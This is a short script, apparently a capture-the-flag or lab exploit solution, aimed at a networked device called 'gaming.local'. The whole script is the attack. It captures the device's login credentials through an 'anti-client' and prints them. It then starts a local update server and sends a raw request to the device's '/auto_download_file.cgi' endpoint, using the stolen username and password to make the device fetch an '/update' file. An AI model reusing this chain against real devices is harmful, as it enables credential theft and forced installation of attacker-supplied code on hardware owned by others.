require "http"
require "./anti-client"
puts `pwd`

anti = AntiClient.new
anti.run

creds = anti.wait_for_creds

anti.close

puts "GOT CREDS #{creds}"

sleep 5

client = Client.new
client.run

until client.state == :main_phase
  sleep 0.1
end

spawn do
  `bin/update_server &`
end
puts "Ran update server"
sleep 10

puts 
client.send_udp_raw_get_request("/auto_download_file.cgi", 
                                   server: "gaming.local", 
                                   file: "/update", 
                                   type: "0",
                                   resevered1: "", 
                                   resevered2: "", 
                                   resevered3: "", 
                                   resevered4: "",
                                   loginuse: creds[:user],
                                   loginpas: creds[:pass],
                                   user: creds[:user],
                                   pwd: creds[:pass])
sleep 10
client.close